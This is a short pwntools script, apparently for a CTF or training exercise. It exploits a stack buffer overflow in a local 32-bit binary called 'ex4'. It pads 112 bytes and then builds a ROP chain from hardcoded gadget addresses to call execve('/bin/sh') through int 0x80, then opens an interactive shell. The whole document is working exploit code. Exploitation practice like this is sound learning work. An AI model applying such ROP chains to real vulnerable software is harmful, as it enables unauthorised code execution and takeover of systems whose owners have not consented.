from pwn import *

"""
ROPgadget+grep: 查找地址
0x080bb196 : pop eax ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x08049421 : int 0x80
0x080be408 : /bin/sh
"""

eax_addr = 0x080bb196
edx_ecx_ebx_addr = 0x0806eb90
int_addr = 0x08049421
bin_sh_addr = 0x080be408

p = process("./ex4")

payload = b"A" * (108 + 4)  # 32位 +4
payload += p32(eax_addr) + p32(0xb) + p32(edx_ecx_ebx_addr) + p32(0) + p32(0) + p32(bin_sh_addr) + p32(int_addr)

p.send(payload)
p.interactive()
